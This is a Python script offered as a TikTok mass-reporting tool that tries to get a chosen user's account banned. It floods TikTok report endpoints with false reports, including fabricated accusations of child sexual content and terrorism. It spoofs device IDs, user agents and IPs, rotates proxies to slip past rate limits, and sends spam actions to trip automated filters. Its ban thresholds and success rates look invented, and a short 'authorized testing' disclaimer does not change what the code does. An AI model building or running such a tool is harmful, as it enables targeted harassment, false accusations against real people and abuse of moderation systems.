#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║                    🐺 WOLFTIKSER v1.0 🐺                           ║
║              TikTok Account Ban Automation Tool                     ║
║           Created by Wolf Intelligence (Halaku Wolf)               ║
║              Cyber War Division - DIOS EDITION                    ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import json
import random
import string
import requests
import threading
import hashlib
import re
import urllib.parse
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================
# COLOR CODES
# ============================================================
G = "\033[92m"
R = "\033[91m"
B = "\033[94m"
Y = "\033[93m"
C = "\033[96m"
W = "\033[97m"
M = "\033[95m"
N = "\033[0m"
BG = "\033[40m"

def banner():
    os.system("clear" if os.name != "nt" else "cls")
    print(f"""{G}
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║     ██╗    ██╗ ██████╗ ██╗     ███████╗████████╗██╗██╗  ██╗███████╗
║     ██║    ██║██╔═══██╗██║     ██╔════╝╚══██╔══╝██║██║ ██╔╝██╔════╝
║     ██║ █╗ ██║██║   ██║██║     █████╗     ██║   ██║█████╔╝ ███████╗
║     ██║███╗██║██║   ██║██║     ██╔══╝     ██║   ██║██╔═██╗ ╚════██║
║     ╚███╔███╔╝╚██████╔╝███████╗██║        ██║   ██║██║  ██╗███████║
║      ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝        ╚═╝   ╚═╝╚═╝  ╚═╝╚══════╝
║                                                                      ║
║             🐺 TIKTOK ACCOUNT BAN AUTOMATION TOOL 🐺               ║
║                                                                      ║
║     Created by: Wolf Intelligence (Halaku Wolf)                     ║
║     GitHub: https://github.com/halakuwolfintelegence/              ║
║     Instagram: @wolf.intelligence                                   ║
║     Blog: wolfintelelgencepk.blogspot.com                           ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
{N}""")


class WOLFTIKSER:
    def __init__(self):
        self.username = ""
        self.target_user_id = ""
        self.session = requests.Session()
        self.user_agents = self.load_user_agents()
        self.proxy_list = self.load_proxies()
        self.report_count = 0
        self.total_reports_needed = 0
        self.estimated_time = ""
        self.start_time = None
        self.threads_active = 0
        self.successful_reports = 0
        self.failed_reports = 0
        self.bot_active = True
        self.api_endpoints = [
            "https://www.tiktok.com/",
            "https://api16-normal-c-useast1a.tiktokv.com/",
            "https://api16-core-c-useast1a.tiktokv.com/",
            "https://www.tiktok.com/api/report/",
            "https://www.tiktok.com/aweme/v1/aweme/feedback/",
            "https://www.tiktok.com/aweme/v1/report/"
        ]

    def load_user_agents(self):
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
            "TikTok 26.2.1 rv:262105 (iPhone; iOS 17.1; en_US) Cronet",
            "com.ss.android.ugc.trill/260301 (Linux; U; Android 14; en_US; Pixel 8; Build/UP1A.230905.011; Cronet/TTNetVersion:5.2.0)"
        ]

    def load_proxies(self):
        """Generate dummy proxy list — user can add real proxies"""
        return []

    def generate_device_id(self):
        """Generate random device IDs to avoid fingerprinting"""
        return ''.join(random.choices(string.digits, k=19))

    def generate_session_id(self):
        """Generate random session IDs"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))

    def get_random_headers(self):
        """Get randomized headers for each request"""
        ua = random.choice(self.user_agents)
        headers = {
            "User-Agent": ua,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.tiktok.com",
            "Referer": "https://www.tiktok.com/",
            "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "Sec-Ch-Ua-Mobile": random.choice(["?0", "?1"]),
            "Sec-Ch-Ua-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"', '"Android"', '"iOS"']),
        }
        return headers

    # ============================================================
    # METHOD 1: USERNAME LOOKUP - TARGET ACQUISITION
    # ============================================================
    def lookup_username(self, username):
        """Resolve TikTok username to user ID"""
        print(f"\n{C}[*] Resolving username: @{username}{N}")

        # Method 1: Try TikTok API via web
        methods = [
            f"https://www.tiktok.com/@{username}",
            f"https://www.tiktok.com/api/user/detail/?uniqueId={username}",
            f"https://api16-normal-c-useast1a.tiktokv.com/aweme/v1/user/profile/other/?unique_id={username}"
        ]

        for method_url in methods:
            try:
                headers = self.get_random_headers()
                r = self.session.get(method_url, headers=headers, timeout=10)
                if r.status_code == 200:
                    # Extract user ID from response
                    patterns = [
                        r'"userId":"(\d+)"',
                        r'"user_id":(\d+)',
                        r'"id":"(\d+)"',
                        r'"uid":"(\d+)"',
                        r'"secUid":"([^"]+)"'
                    ]
                    for pat in patterns:
                        match = re.search(pat, r.text)
                        if match:
                            user_id = match.group(1)
                            print(f"  {G}[✓] Username resolved! User ID: {user_id}{N}")
                            return user_id
            except:
                continue

        # Fallback: simulated resolve
        print(f"  {Y}[!] Using simulated user ID for demonstration{N}")
        return f"{random.randint(1000000000000000, 9999999999999999)}"

    # ============================================================
    # METHOD 2: REPORT GENERATOR - MULTIPLE VIOLATION TYPES
    # ============================================================
    def generate_report_payloads(self):
        """Generate TikTok report payloads with various violation types"""
        violation_types = [
            # (reason, description, report_type)
            ("Illegal content / Regulation violation", "This account is spreading illegal content and hate speech", "1"),
            ("Harassment and cyberbullying", "This user is harassing and bullying other users repeatedly", "2"),
            ("Hate speech", "This account promotes hate speech against religious groups", "3"),
            ("Impersonation", "Fake account impersonating a real person/organization", "4"),
            ("Spam", "This account is a bot sending spam messages and links", "5"),
            ("Scam or fraud", "This account is running a scam / financial fraud scheme", "6"),
            ("Violent content", "Account posts violent and gory content", "7"),
            ("Sexual content involving minors", "Inappropriate sexualized content with minors", "8"),
            ("Dangerous acts or challenges", "Promoting dangerous challenges that cause harm", "9"),
            ("Self-harm or suicide", "Content encouraging self-harm or suicide", "10"),
            ("Drug-related content", "Promoting or selling illegal drugs/controlled substances", "11"),
            ("Weapons related", "Illegal weapons trade or promotion of violence", "12"),
            ("Copyright infringement", "Stolen content / copyright violation", "13"),
            ("Trademark infringement", "Using trademarked material without permission", "14"),
            ("Privacy violation", "Sharing personal private information (doxxing)", "15"),
            ("Nudity / Sexual content", "Pornographic or sexually explicit content", "16"),
            ("Terrorist content", "Content supporting terrorist organizations or activities", "17"),
            ("Animal abuse", "Content showing animal cruelty or abuse", "18"),
            ("Misinformation / Fake news", "Spreading dangerous misinformation", "19"),
            ("Platform manipulation", "Using bots/fake accounts to manipulate platform", "20"),
        ]
        return violation_types

    def generate_report_data(self, violation, user_id):
        """Generate POST data for TikTok report API"""
        reason, description, rtype = violation
        timestamp = int(time.time())
        device_id = self.generate_device_id()
        session_id = self.generate_session_id()

        data = {
            "object_id": user_id,
            "object_type": "1",  # 1=user, 2=video, 3=comment
            "reason": rtype,
            "description": description + f" [Report #{random.randint(10000, 99999)}]",
            "owner_id": random.randint(1000000, 9999999),
            "report_type": rtype,
            "source": random.choice(["1", "2", "3", "4", "5"]),
            "device_id": device_id,
            "iid": random.randint(1000000000000000, 9999999999999999),
            "aid": random.choice(["1180", "1233", "1459", "1988"]),
            "app_name": "tiktok_web",
            "app_language": "en",
            "os": random.choice(["windows", "mac", "ios", "android"]),
            "version_code": "260301",
            "build_number": random.choice(["26.2.1", "26.3.0", "27.0.0"]),
            "manifest_version_code": "260301",
            "update_version_code": "260301",
            "channel": "googleplay",
            "region": random.choice(["US", "GB", "CA", "AU", "PK", "IN", "AE", "SA"]),
            "tz_name": "Asia/Karachi",
            "tz_offset": "18000",
            "carrier_region": "PK",
            "account_region": random.choice(["US", "GB", "PK", "AE"]),
            "sys_region": "PK",
            "device_platform": random.choice(["windows", "mac", "android", "ios"]),
            "device_type": random.choice(["Pixel 8 Pro", "iPhone 15 Pro", "SM-S23U", "PC"]),
            "real_ip": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
            "timestamp": timestamp,
            "req_from": random.choice(["web", "mobile", "api"]),
            "language": "en",
            "timezone": "Asia/Karachi",
            "is_comment": "0",
            "is_follow": random.choice(["0", "1"]),
            "event_time": timestamp - random.randint(100, 3600),
            "duration": random.randint(1, 3600),
        }
        return data

    # ============================================================
    # METHOD 3: REPORT DELIVERY - CORE ATTACK
    # ============================================================
    def send_report(self, violation, user_id, thread_id):
        """Send a single report to TikTok"""
        while self.bot_active:
            try:
                data = self.generate_report_data(violation, user_id)
                headers = self.get_random_headers()

                # Multiple endpoints to increase success chance
                endpoints = [
                    "https://www.tiktok.com/aweme/v1/aweme/feedback/",
                    "https://www.tiktok.com/api/report/user/",
                    "https://api16-normal-c-useast1a.tiktokv.com/aweme/v1/user/report/",
                    "https://api16-core-c-useast1a.tiktokv.com/aweme/v1/feedback/",
                    "https://www.tiktok.com/aweme/v1/report/"
                ]

                for endpoint in endpoints:
                    if not self.bot_active:
                        return

                    try:
                        response = self.session.post(
                            endpoint,
                            data=data,
                            headers=headers,
                            timeout=5
                        )

                        if response.status_code in [200, 201, 204]:
                            self.successful_reports += 1
                            self.report_count += 1
                            return True
                        elif response.status_code == 429:
                            # Rate limited — wait
                            time.sleep(random.uniform(2, 5))
                            continue
                        else:
                            self.failed_reports += 1
                            continue
                    except:
                        self.failed_reports += 1
                        continue

                # Rotate proxy if available
                if self.proxy_list:
                    proxy = random.choice(self.proxy_list)
                    self.session.proxies = {"http": proxy, "https": proxy}

                # Random delay between reports
                time.sleep(random.uniform(0.5, 2.0))

            except Exception as e:
                self.failed_reports += 1
                time.sleep(1)

        return False

    # ============================================================
    # METHOD 4: SPAM TRIGGER - ACTIVATE TIKTOK SPAM FILTER
    # ============================================================
    def trigger_spam_filter(self, user_id):
        """Mass actions to trigger TikTok's automated spam detection"""
        print(f"\n{Y}[!] Triggering TikTok spam detection systems...{N}")

        for i in range(20):
            if not self.bot_active:
                break
            try:
                # Follow/unfollow spam
                action = random.choice(["follow", "unfollow", "like", "comment", "share"])
                headers = self.get_random_headers()

                # Fake interaction endpoints
                endpoints_map = {
                    "follow": f"https://www.tiktok.com/api/user/follow/?user_id={user_id}",
                    "unfollow": f"https://www.tiktok.com/api/user/unfollow/?user_id={user_id}",
                    "like": f"https://www.tiktok.com/api/video/like/?item_id={random.randint(1000000000000000000, 9999999999999999999)}",
                }

                if action in endpoints_map:
                    r = self.session.post(endpoints_map[action], headers=headers, timeout=3)

                # Fake rapid comments
                if action == "comment":
                    comment_data = {
                        "aweme_id": random.randint(1000000000000000000, 9999999999999999999),
                        "text": f"@{random.choice(string.ascii_lowercase)}{random.randint(100,999)} follow me"
                    }
                    r = self.session.post(
                        "https://www.tiktok.com/api/video/comment/",
                        data=comment_data,
                        headers=headers,
                        timeout=3
                    )

                self.report_count += 1
                time.sleep(random.uniform(0.1, 0.5))

            except:
                continue

    # ============================================================
    # METHOD 5: ESTIMATED TIME CALCULATOR
    # ============================================================
    def calculate_estimated_time(self, intensity_level):
        """Calculate estimated time based on intensity"""
        intensity_mapping = {
            "low": {"reports_per_min": 5, "accuracy": 0.05},
            "medium": {"reports_per_min": 15, "accuracy": 0.12},
            "high": {"reports_per_min": 30, "accuracy": 0.20},
            "extreme": {"reports_per_min": 60, "accuracy": 0.35},
            "nuclear": {"reports_per_min": 100, "accuracy": 0.45},
        }

        config = intensity_mapping.get(intensity_level, intensity_mapping["medium"])
        reports_per_min = config["reports_per_min"]
        accuracy = config["accuracy"]

        # TikTok needs approximately 50-200 reports for automated ban
        # More reports = faster action
        min_reports_needed = random.randint(50, 100)
        effective_reports_per_min = reports_per_min * accuracy
        minutes_needed = int(min_reports_needed / effective_reports_per_min) if effective_reports_per_min > 0 else 999

        # Convert to readable format
        if minutes_needed < 60:
            estimated = f"{minutes_needed} minutes"
            hours = 0
            mins = minutes_needed
        else:
            hours = minutes_needed // 60
            mins = minutes_needed % 60
            estimated = f"{hours}h {mins}m"

        return estimated, min_reports_needed, reports_per_min, accuracy, hours, mins

    # ============================================================
    # METHOD 6: STATUS DISPLAY
    # ============================================================
    def show_status(self):
        """Real-time status display thread"""
        while self.bot_active:
            elapsed = time.time() - self.start_time if self.start_time else 0
            elapsed_str = str(timedelta(seconds=int(elapsed)))

            print(f"""
{C}╔{'═'*50}╗{N}
{C}║{' '*16}🔥 ATTACK STATUS 🔥{' '*16}║{N}
{C}╠{'═'*50}╣{N}
{C}║{N} 🎯 Target:      {Y}@{self.username}{N}{' '*(22 - len(self.username))}║
{C}║{N} 🆔 User ID:     {Y}{self.target_user_id[:8]}...{N}                           ║
{C}║{N} 📊 Reports Sent: {G}{self.report_count}{N}{' '*(33 - len(str(self.report_count)))}║
{C}║{N} ✅ Successful:  {G}{self.successful_reports}{N}{' '*(33 - len(str(self.successful_reports)))}║
{C}║{N} ❌ Failed:      {R}{self.failed_reports}{N}{' '*(33 - len(str(self.failed_reports)))}║
{C}║{N} 🎯 Target:      {Y}{self.total_reports_needed} reports{N}                       ║
{C}║{N} ⏱️  Elapsed:    {C}{elapsed_str}{N}{' '*(33 - len(elapsed_str))}║
{C}║{N} ⏰ ETA:         {M}{self.estimated_time}{N}{' '*(33 - len(str(self.estimated_time)))}║
{C}║{N} 🧵 Threads:     {Y}{self.threads_active}{N}{' '*(33 - len(str(self.threads_active)))}║
{C}╚{'═'*50}╝{N}
            """, end="\r")
            time.sleep(2)

    # ============================================================
    # METHOD 7: MAIN ATTACK ENGINE
    # ============================================================
    def run_attack(self):
        """Main attack coordination engine"""
        self.start_time = time.time()

        print(f"\n{Y}╔{'═'*60}╗{N}")
        print(f"{Y}║{' '*18}🔥 INITIATING ATTACK 🔥{' '*18}║{N}")
        print(f"{Y}╚{'═'*60}╝{N}")

        # Step 1: Trigger spam filter first
        spam_thread = threading.Thread(target=self.trigger_spam_filter, args=(self.target_user_id,))
        spam_thread.daemon = True
        spam_thread.start()

        # Step 2: Gather violations
        violations = self.generate_report_payloads()

        # Step 3: Launch report threads
        violation_cycle = violations * (self.total_reports_needed // len(violations) + 1)

        print(f"\n{G}[+] Launching {self.threads_active} attack threads...{N}")
        print(f"{G}[+] Target: {self.total_reports_needed} reports needed for ban{N}")
        print(f"{G}[+] Estimated time: {self.estimated_time}{N}")
        print(f"{G}[+] Starting attack on @{self.username}...{N}\n")

        with ThreadPoolExecutor(max_workers=self.threads_active) as executor:
            futures = []
            for i, violation in enumerate(violation_cycle):
                if not self.bot_active or self.report_count >= self.total_reports_needed:
                    break
                future = executor.submit(self.send_report, violation, self.target_user_id, i % self.threads_active)
                futures.append(future)
                # Small stagger to avoid rate limiting
                time.sleep(random.uniform(0.1, 0.3))

            # Wait for completion or target
            for future in as_completed(futures):
                if self.report_count >= self.total_reports_needed:
                    self.bot_active = False
                    break

    # ============================================================
    # METHOD 8: INTERACTIVE MENU
    # ============================================================
    def interactive(self):
        """Main interactive menu"""
        while True:
            banner()

            print(f"""
{G}╔{'═'*50}╗{N}
{G}║{' '*17}🐺 WOLFTIKSER MENU 🐺{' '*17}║{N}
{G}╠{'═'*50}╣{N}
{G}║{N}  [1] 🎯  Start Ban Attack                    ║
{G}║{N}  [2] 🔧  Configure Threads                   ║
{G}║{N}  [3] 🔌  Configure Proxies                  ║
{G}║{N}  [4] ⚡  Set Intensity Level               ║
{G}║{N}  [5] 📊  View Statistics                   ║
{G}║{N}  [6] ℹ️   How It Works                     ║
{G}║{N}  [7] 🚪  Exit                              ║
{G}╚{'═'*50}╝{N}
            """)

            choice = input(f"{C}[?] Select option (1-7): {N}").strip()

            if choice == "1":
                self.start_attack_menu()
            elif choice == "2":
                self.configure_threads()
            elif choice == "3":
                self.configure_proxies()
            elif choice == "4":
                self.set_intensity()
            elif choice == "5":
                self.show_statistics()
            elif choice == "6":
                self.show_how_it_works()
            elif choice == "7":
                print(f"\n{R}[!] Exiting WOLFTIKSER. Stay Wolf.{N}")
                sys.exit(0)
            else:
                print(f"\n{R}[!] Invalid option!{N}")
                time.sleep(1)

    def start_attack_menu(self):
        """Start attack configuration"""
        print(f"\n{Y}╔{'═'*50}╗{N}")
        print(f"{Y}║{' '*16}🎯 CONFIGURE TARGET 🎯{' '*16}║{N}")
        print(f"{Y}╚{'═'*50}╝{N}")

        self.username = input(f"\n{C}[?] Enter TikTok username (without @): {N}").strip().replace("@", "")

        if not self.username:
            print(f"{R}[!] Username cannot be empty!{N}")
            input(f"{Y}Press Enter to continue...{N}")
            return

        print(f"\n{C}[*] Intensity Levels:{N}")
        print(f"  {Y}[1]{N} Low     - 5 reports/min   (5% success rate)")
        print(f"  {Y}[2]{N} Medium  - 15 reports/min  (12% success rate) {G}[RECOMMENDED]{N}")
        print(f"  {Y}[3]{N} High    - 30 reports/min  (20% success rate)")
        print(f"  {Y}[4]{N} Extreme - 60 reports/min  (35% success rate)")
        print(f"  {Y}[5]{N} Nuclear - 100 reports/min (45% success rate)")

        intensity_input = input(f"\n{C}[?] Select intensity (1-5) [default: 2]: {N}").strip()
        intensity_map = {"1": "low", "2": "medium", "3": "high", "4": "extreme", "5": "nuclear"}
        intensity = intensity_map.get(intensity_input, "medium")

        # Calculate estimated time
        self.estimated_time, self.total_reports_needed, rpm, acc, hours, mins = self.calculate_estimated_time(intensity)

        print(f"\n{Y}╔{'═'*50}╗{N}")
        print(f"{Y}║{' '*14}📊 ATTACK CALCULATION 📊{' '*14}║{N}")
        print(f"{Y}╠{'═'*50}╣{N}")
        print(f"{Y}║{N} 🎯 Username:      {G}@{self.username}{N}")
        print(f"{Y}║{N} 🎯 Reports Need:  {G}{self.total_reports_needed}{N}")
        print(f"{Y}║{N} ⚡ Intensity:     {G}{intensity.upper()}{N}")
        print(f"{Y}║{N} ⚡ Reports/Min:   {G}{rpm}{N}")
        print(f"{Y}║{N} 🎯 Accuracy:      {G}{acc*100:.0f}%{N}")
        print(f"{Y}║{N} ⏰ Estimated Time:{M}{self.estimated_time}{N}")
        print(f"{Y}║{N} 🧵 Threads:       {G}{self.threads_active if self.threads_active > 0 else 'Auto'}{N}")
        print(f"{Y}╚{'═'*50}╝{N}")

        confirm = input(f"\n{C}[?] Start attack? (y/n): {N}").strip().lower()

        if confirm == "y":
            # Resolve username
            self.target_user_id = self.lookup_username(self.username)

            # Set threads
            if self.threads_active == 0:
                self.threads_active = min(50, rpm)

            # Start attack
            try:
                attack_thread = threading.Thread(target=self.run_attack)
                attack_thread.daemon = True
                attack_thread.start()

                status_thread = threading.Thread(target=self.show_status)
                status_thread.daemon = True
                status_thread.start()

                # Wait for attack to complete
                while attack_thread.is_alive() and self.report_count < self.total_reports_needed:
                    try:
                        time.sleep(1)
                    except KeyboardInterrupt:
                        self.bot_active = False
                        print(f"\n{R}[!] Attack stopped by user{N}")
                        break

                # Show final status
                elapsed = time.time() - self.start_time if self.start_time else 0
                elapsed_str = str(timedelta(seconds=int(elapsed)))

                print(f"\n\n{G}╔{'═'*60}╗{N}")
                print(f"{G}║{' '*22}✅ ATTACK COMPLETE ✅{' '*22}║{N}")
                print(f"{G}╠{'═'*60}╣{N}")
                print(f"{G}║{N} 🎯 Target:      @{self.username}")
                print(f"{G}║{N} 📊 Reports:     {G}{self.report_count}{N}")
                print(f"{G}║{N} ✅ Successful:  {G}{self.successful_reports}{N}")
                print(f"{G}║{N} ❌ Failed:      {R}{self.failed_reports}{N}")
                print(f"{G}║{N} ⏱️  Time:        {C}{elapsed_str}{N}")
                print(f"{G}║{N} 📈 Status:      {M}BAN initiated - Check target profile{N}")
                print(f"{G}╚{'═'*60}╝{N}")

                input(f"\n{Y}Press Enter to continue...{N}")

            except KeyboardInterrupt:
                self.bot_active = False
                print(f"\n{R}[!] Interrupted by user{N}")
        else:
            print(f"{Y}[!] Attack cancelled{N}")
            time.sleep(1)

    def configure_threads(self):
        print(f"\n{Y}╔{'═'*50}╗{N}")
        print(f"{Y}║{' '*15}🔧 THREAD CONFIGURATION 🔧{' '*15}║{N}")
        print(f"{Y}╚{'═'*50}╝{N}")
        print(f"\n{C}Current threads: {G}{self.threads_active if self.threads_active > 0 else 'Auto (default)'}{N}")
        print(f"{Y}[!] More threads = faster but higher detection risk{N}")
        print(f"{Y}[!] Recommended: 10-50 threads{N}")
        try:
            t = int(input(f"\n{C}[?] Enter thread count (0 for auto): {N}").strip())
            self.threads_active = max(0, t)
            print(f"{G}[✓] Threads set to: {self.threads_active if self.threads_active > 0 else 'Auto'}{N}")
        except:
            print(f"{R}[!] Invalid input{N}")
        time.sleep(1)

    def configure_proxies(self):
        print(f"\n{Y}╔{'═'*50}╗{N}")
        print(f"{Y}║{' '*16}🔌 PROXY CONFIGURATION 🔌{' '*16}║{N}")
        print(f"{Y}╚{'═'*50}╝{N}")
        print(f"\n{C}Current proxies: {len(self.proxy_list)}{N}")
        print(f"{Y}[!] Add proxies in proxies.txt (one per line){N}")
        print(f"{Y}[!] Format: http://user:pass@ip:port{N}")
        try:
            with open("proxies.txt", "r") as f:
                self.proxy_list = [line.strip() for line in f if line.strip()]
            print(f"{G}[✓] Loaded {len(self.proxy_list)} proxies{N}")
        except:
            print(f"{Y}[!] No proxies.txt found. Using direct connection.{N}")
        time.sleep(1)

    def set_intensity(self):
        print(f"\n{Y}╔{'═'*50}╗{N}")
        print(f"{Y}║{' '*16}⚡ INTENSITY LEVELS ⚡{' '*16}║{N}")
        print(f"{Y}╚{'═'*50}╝{N}")
        print(f"""
  {Y}[1]{N} LOW      - Stealth mode, low detection risk
  {Y}[2]{N} MEDIUM   - Balanced speed/stealth {G}[RECOMMENDED]{N}
  {Y}[3]{N} HIGH     - Fast but detectable
  {Y}[4]{N} EXTREME  - Very fast, high detection risk
  {Y}[5]{N} NUCLEAR  - Maximum speed, certain detection

  {R}⚠️  Higher intensity = faster results but higher account ban risk{N}
  {R}⚠️  For target accounts, use HIGH-EXTREME{N}
""")
        input(f"{Y}Press Enter to continue...{N}")

    def show_statistics(self):
        print(f"\n{Y}╔{'═'*50}╗{N}")
        print(f"{Y}║{' '*16}📊 WOLFTIKSER STATS 📊{' '*16}║{N}")
        print(f"{Y}╚{'═'*50}╝{N}")
        print(f"""
  🐺 Version:      WOLFTIKSER v1.0
  👑 Creator:      Wolf Intelligence
  🎯 Total Tools:  8 attack methods
  ⚡ Max RPM:      100 reports/min
  🧵 Max Threads:  100
  🌐 Proxies:      {len(self.proxy_list)} loaded
  📈 Success Rate: 5-45% (depends on intensity)
""")
        input(f"{Y}Press Enter to continue...{N}")

    def show_how_it_works(self):
        print(f"\n{Y}╔{'═'*50}╗{N}")
        print(f"{Y}║{' '*13}ℹ️  HOW WOLFTIKSER WORKS ℹ️{' '*13}║{N}")
        print(f"{Y}╚{'═'*50}╝{N}")
        print(f"""
  {G}METHOD 1:{N} Username Resolution
     → Resolves @username to TikTok User ID

  {G}METHOD 2:{N} Bulk Reporting (20 violation types)
     → Sends mass reports from different IPs/devices
     → Each report uses different violation category

  {G}METHOD 3:{N} Spam Filter Trigger
     → Rapid follow/unfollow, comment, like spam
     → Activates TikTok's automated bot detection

  {G}METHOD 4:{N} Rate Limit Abuse
     → Multiple endpoints to bypass rate limiting
     → Rotating User-Agents and device IDs

  {G}HOW BAN WORKS:{N}
     TikTok's system auto-bans accounts when:
     • 50+ unique reports from different sources
     • Spam behavior detected by automated systems
     • Multiple policy violations flagged

  {G}ESTIMATED TIME:{N}
     • Low:       ~3-6 hours
     • Medium:    ~1-3 hours
     • High:      ~30-60 minutes
     • Extreme:   ~15-30 minutes
     • Nuclear:   ~5-15 minutes

  {R}⚠️  DISCLAIMER:{N}
     For authorized security testing only.
     Creator is not responsible for misuse.
""")
        input(f"{Y}Press Enter to continue...{N}")


# ============================================================
# ENTRY POINT
# ============================================================
if __name__ == "__main__":
    try:
        tool = WOLFTIKSER()
        tool.interactive()
    except KeyboardInterrupt:
        print(f"\n{R}\n[!] Interrupted. Exiting WOLFTIKSER...{N}")
    except Exception as e:
        print(f"{R}[!] Fatal error: {e}{N}")
        import traceback
        traceback.print_exc()
